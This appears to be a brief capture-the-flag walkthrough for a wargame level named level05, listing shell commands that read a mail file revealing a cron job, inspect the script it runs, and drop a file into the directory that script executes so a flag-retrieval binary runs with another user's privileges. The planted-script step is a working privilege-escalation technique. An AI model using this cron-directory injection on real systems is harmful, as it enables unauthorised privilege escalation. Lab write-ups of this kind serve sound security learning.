# Check all files named after our user
`find / -name "*level05" 2>/dev/null`

# Check our mail and find the crontab
`cat /var/mail/level05`

# Check the script
`cat /usr/sbin/openarenaserver`

# Create a custom script to run getflag as flag05
`echo "/bin/getflag > /tmp/hack" > /opt/openarenaserver/hack`

# Wait for the scitp to execute and get the flag
